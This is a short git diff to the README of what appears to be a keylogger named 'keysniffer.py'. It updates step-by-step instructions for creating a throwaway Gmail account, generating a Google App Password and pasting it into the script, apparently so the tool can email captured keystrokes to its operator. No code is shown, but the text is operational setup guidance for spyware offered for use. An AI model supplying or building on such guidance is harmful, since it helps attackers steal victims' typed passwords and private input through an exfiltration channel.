@@ -16,5 +16,6 @@
 >### How to make the "sender email"
 >1. Create a normal email, like you would do for yourself.
 >2. Go to the ***google account*** (of the new email created)
->3. Go to ***Security***
->4. 
+>3. Search in the search bar for ***App Passwords***
+>4. Create a new one and name it ***Python***, after that a password will show up. (If it doesnt show up retry creating a new one)
+>5. Copy it and paste it in the ***keysniffer.py*** as the password for the email, remove spaces.
